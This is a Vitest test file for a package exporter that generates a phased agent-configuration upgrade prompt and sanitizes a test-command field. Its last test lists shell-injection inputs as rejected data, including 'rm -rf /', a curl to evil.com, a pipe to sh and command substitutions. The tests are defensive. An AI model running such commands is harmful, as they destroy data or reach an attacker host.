import { describe, it, expect } from 'vitest';
import {
  renderUpgradePromptMarkdown,
  sanitizeOperationalTestCommand,
} from '../src/modules/package-exporter/templates';

describe('Upgrade Prompt Exporter & Non-destructive Safety', () => {
  const dummyFiles = [
    {
      relativePath: 'AGENTS.md',
      content: '# Directives Antigravity\n\nContenu généré de base.',
    },
    {
      relativePath: '.agents/rules/nextjs-rules.md',
      content: '---\ndescription: Règles Next.js 15\nglobs: ["src/app/**/*"]\n---\nUtiliser les Server Components par défaut.',
    },
    {
      relativePath: '.agents/skills/modern-web/SKILL.md',
      content: '---\nname: modern-web\ndescription: Bonnes pratiques du web moderne\n---\nDirectives de skill.',
    },
    {
      relativePath: 'docs/SOURCES.md',
      content: '# Références lourdes (> 80 Ko)\n' + 'Explications théoriques répétitives...\n'.repeat(500),
    },
  ];

  it('génère un prompt de mise à niveau complet avec les 5 phases obligatoires', () => {
    const prompt = renderUpgradePromptMarkdown({
      projectName: 'AcmePortal',
      targetSurface: 'IDE',
      files: dummyFiles,
      operationalTestCommand: 'npm test',
    });

    // 1. Snapshot guard
    expect(prompt).toContain('Phase 1 — Sauvegarde automatique préalable');
    expect(prompt).toContain('.agents/.harness-backup/');

    // 2. Dry run
    expect(prompt).toContain('Phase 2 — Mode Simulation préalable');
    expect(prompt).toContain('[KEEP / PRESERVE]');
    expect(prompt).toContain('[SMART MERGE]');

    // 3. Smart Merge avec balises délimitées
    expect(prompt).toContain('Phase 3 — Déploiement et Fusion Intelligente');
    expect(prompt).toContain('<!-- BEGIN ANTIGRAVITY HARNESS BUILDER MANAGED -->');
    expect(prompt).toContain('<!-- END ANTIGRAVITY HARNESS BUILDER MANAGED -->');

    // 4. Deprecations
    expect(prompt).toContain('Phase 4 — Éléments obsolètes');
    expect(prompt).toContain('.agents/workflows/');
    expect(prompt).toContain('Ne le déplace pas sans son accord');
    // Aucune instruction de modifier les agents de l'utilisateur
    expect(prompt).not.toContain('supprime cette ligne');
    expect(prompt).toContain('Ne modifie jamais');

    // 5. Smoke test
    expect(prompt).toContain('Phase 5 — Validation finale & Smoke Test');
    expect(prompt).toContain('npm test');

    // Tous les fichiers gérés sont répertoriés
    expect(prompt).toContain('AGENTS.md');
    expect(prompt).toContain('.agents/rules/nextjs-rules.md');
    expect(prompt).toContain('.agents/skills/modern-web/SKILL.md');
  });

  it('gère correctement les fences dynamiques pour isoler le contenu', () => {
    const filesWithBackticks = [
      {
        relativePath: 'docs/EXAMPLE.md',
        content: 'Voici un exemple ```bash npm test ``` imbriqué.',
      },
    ];

    const prompt = renderUpgradePromptMarkdown({
      projectName: 'TestApp',
      files: filesWithBackticks,
    });

    // La barrière de sécurité doit comporter au moins 4 backticks pour englober les 3 backticks
    expect(prompt).toContain('````markdown');
    expect(prompt).toContain('Voici un exemple ```bash npm test ``` imbriqué.');
  });

  it('neutralise strictement les injections de commandes shell dans operationalTestCommand', () => {
    // Commandes valides
    expect(sanitizeOperationalTestCommand('npm test')).toBe('npm test');
    expect(sanitizeOperationalTestCommand('pnpm test:run')).toBe('pnpm test:run');
    expect(sanitizeOperationalTestCommand('cargo test')).toBe('cargo test');
    expect(sanitizeOperationalTestCommand('pytest tests/')).toBe('pytest tests/');

    // Tentatives d'injection avec métacaractères shell
    expect(sanitizeOperationalTestCommand('npm test; rm -rf /')).toBeUndefined();
    expect(sanitizeOperationalTestCommand('npm test && curl evil.com')).toBeUndefined();
    expect(sanitizeOperationalTestCommand('npm test | sh')).toBeUndefined();
    expect(sanitizeOperationalTestCommand('npm test $(whoami)')).toBeUndefined();
    expect(sanitizeOperationalTestCommand('npm test `id`')).toBeUndefined();
    expect(sanitizeOperationalTestCommand('rm -rf /')).toBeUndefined();
  });

});
